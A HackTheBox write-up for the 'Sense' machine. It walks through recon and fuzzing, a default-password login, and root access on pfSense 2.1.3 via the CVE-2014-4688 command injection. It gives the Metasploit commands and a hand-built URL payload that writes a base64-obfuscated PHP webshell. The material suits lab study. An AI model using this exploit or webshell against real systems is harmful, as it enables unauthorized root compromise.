Sense

HackTheBox · Easy by Brenno M.

Sense is a pfSense 2.1.3 firewall. A file left on the web server gives away the username and a hint to the password (pfSense's default), and with an authenticated session a command injection in status_rrd_graph_img.php (CVE-2014-4688) runs as root.

Reconnaissance

Only HTTP and HTTPS are open. Port 80 redirects to 443, where the pfSense login is served by lighttpd 1.4.35.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p80,443 <IP>
# 80 lighttpd 1.4.35 (redirect to https), 443 pfSense login

Fuzzing needs the .txt extension and a bigger wordlist. It finds changelog.txt, which warns that not every fix was applied, and system-users.txt.

ffuf -u https://<IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt,.php
curl -k https://<IP>/system-users.txt
# username: Rohit
# password: company defaults

Access - default credentials

"Company defaults" means pfSense's default password, pfsense. The username goes in lowercase: rohit / pfsense. The dashboard shows version 2.1.3-RELEASE.

Exploitation - CVE-2014-4688

The database parameter of status_rrd_graph_img.php is concatenated into a shell command. pfSense runs its web UI as root, so the injection gives full privileges right away. The Metasploit module handles both login and injection.

msfconsole -q
use exploit/unix/http/pfsense_graph_injection_exec
set RHOSTS <IP>
set USERNAME rohit
set PASSWORD pfsense
set LHOST tun0
run

By hand, with rohit's session open in the browser, the injection writes a PHP webshell to the web root. The payload is base64-encoded to slip past the character filter.

https://<IP>/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+"%3C%3Fphp+eval%28base64_decode%28%27ZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTs%27%29%29%3B%3F%3E">writeup.php
https://<IP>/writeup.php?cmd=id                       # uid=0(root)
https://<IP>/writeup.php?cmd=cat%20/home/rohit/user.txt
https://<IP>/writeup.php?cmd=cat%20/root/root.txt
